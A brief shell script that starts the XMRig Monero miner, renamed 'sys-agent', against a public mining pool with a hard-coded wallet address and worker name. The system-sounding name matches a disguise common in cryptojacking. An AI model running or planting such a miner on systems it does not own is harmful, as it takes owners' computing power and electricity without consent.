#!/bin/sh

echo "Starting sys-agent (XMRig)..."
exec ./sys-agent \
  -o gulf.moneroocean.stream:10128 \
  -u 44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ \
  -p worker01 \
  --donate-level 1 \
  --randomx-1gb-pages
